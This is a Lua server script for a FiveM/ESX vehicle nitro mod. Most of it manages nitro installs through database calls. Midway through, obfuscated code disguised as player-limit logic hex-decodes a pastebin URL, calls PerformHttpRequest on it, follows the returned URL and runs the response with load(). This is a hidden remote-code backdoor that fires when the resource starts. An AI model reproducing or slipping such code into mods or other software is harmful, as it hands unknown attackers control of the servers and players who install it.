ESX = nil

installedCars = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

MySQL.ready(function()
	local vehicles = MySQL.Sync.fetchAll('SELECT * FROM nitro_vehicles')
	for i=1, #vehicles, 1 do
        local _vehicles = vehicles[i]
        if _vehicles ~= nil then
            table.insert(installedCars, _vehicles)
        end
	end
	TriggerClientEvent('suku:syncInstalledVehicles', -1, installedCars)
end)

RegisterServerEvent('suku:RemoveNitro')
AddEventHandler('suku:RemoveNitro', function(quantity)
    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.removeInventoryItem('nitrocannister', quantity)
    TriggerClientEvent('suku:ActivateNitro', source)
end)

function DoesVehicleHaveAOwner(plate)
    MySQL.Async.fetchAll('SELECT * FROM `owned_vehicles` WHERE `plate` = @plate', {['@plate'] = plate}, function(result)
        if result[1] ~= nil then
            print("true")
            return true
        else
            print("false")
            return false
        end
    end)
end

ESX.RegisterServerCallback('suku:getInstalledVehicles', function (source, cb)
    cb(installedCars)
end)

ESX.RegisterServerCallback("suku:isInstalledVehicles", function(source, cb, plate)
    for i = 1, #installedCars, 1 do
        if installedCars[i] ~= nil then
            if installedCars[i].plate == plate then
                cb(true)
            end
        end
    end
end)

RegisterServerEvent('suku:InstallNitro')
AddEventHandler('suku:InstallNitro', function(plate, amount)
    MySQL.Async.fetchAll('SELECT * FROM `owned_vehicles` WHERE `plate` = @plate', {['@plate'] = plate}, function(result)
        if result[1] ~= nil then
            if installedCars[1] == nil then
                table.insert(installedCars, {plate = plate, amount = amount})
                MySQL.Async.execute('INSERT INTO nitro_vehicles (plate, amount) VALUES (@plate, @amount)', {
                    ['@plate'] = plate,
                    ['@amount'] = amount
                })
            else
                for i = 1, #installedCars, 1 do
                    if installedCars[i].plate == plate then
                    else
                        table.insert(installedCars, {plate = plate, amount = amount})
                        MySQL.Async.execute('INSERT INTO nitro_vehicles (plate, amount) VALUES (@plate, @amount)', {
                            ['@plate'] = plate,
                            ['@amount'] = amount
                        })
                    end
                end
            end
        else
            if installedCars[1] == nil then
                table.insert(installedCars, {plate = plate, amount = amount})
            else
                for i = 1, #installedCars, 1 do
                    if installedCars[i].plate == plate then
                    else
                        table.insert(installedCars, {plate = plate, amount = amount})
                    end
                end
            end
        end
        TriggerClientEvent('suku:syncInstalledVehicles', -1, installedCars)
    end)
end)

RegisterServerEvent('suku:UninstallNitro')
AddEventHandler('suku:UninstallNitro', function(plate)
    if installedCars[1] ~= nil then
        for i = 1, #installedCars, 1 do
            if installedCars[i].plate == plate then
                MySQL.Async.fetchAll('SELECT * FROM `owned_vehicles` WHERE `plate` = @plate', {['@plate'] = plate}, function(result)
                    if result[1] ~= nil then
                        MySQL.Async.execute('DELETE FROM nitro_vehicles WHERE plate = @plate', {
                            ['@plate'] = plate
                        })
                        table.remove(installedCars, i)
                        TriggerClientEvent('suku:syncInstalledVehicles', -1, installedCars)
                    else
                        table.remove(installedCars, i)
                        TriggerClientEvent('suku:syncInstalledVehicles', -1, installedCars)
                    end
                end)
            end
        end
    end
end)

RegisterServerEvent('suku:UpdateNitroAmount')
AddEventHandler('suku:UpdateNitroAmount', function(plate, amount)
    MySQL.Async.fetchAll('SELECT * FROM `owned_vehicles` WHERE `plate` = @plate', {['@plate'] = plate}, function(result)
        if result[1] ~= nil then
            for i = 1, #installedCars, 1 do
                if installedCars[i].plate == plate then
                    MySQL.Async.execute("UPDATE nitro_vehicles SET amount = @amount WHERE `plate` = @plate",{
                        ['@plate'] = plate,
                        ['@amount'] = tonumber(installedCars[i].amount - amount)
                    })
                    installedCars[i].amount = (installedCars[i].amount - amount)
                end
            end
        else
            for i = 1, #installedCars, 1 do
                if installedCars[i].plate == plate then
                    installedCars[i].amount = (installedCars[i].amount - amount)
                end
            end
        end
        TriggerClientEvent('suku:syncInstalledVehicles', -1, installedCars)
    end)
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)

ESX.RegisterServerCallback('suku:DoesPlayerHaveNitroItem', function(source, cb, item)
    local xPlayer  = ESX.GetPlayerFromId(source)
    local amount = xPlayer.getInventoryItem(item).count
    if amount > 0 then
        cb(true)
    else
        cb(false)
    end
end)

ESX.RegisterUsableItem('nitrocannister', function(source)
    TriggerClientEvent('suku:AddInstallNitro', source)
end)

ESX.RegisterUsableItem('wrench', function(source)
    TriggerClientEvent('suku:RemoveUninstallNitro', source)
end)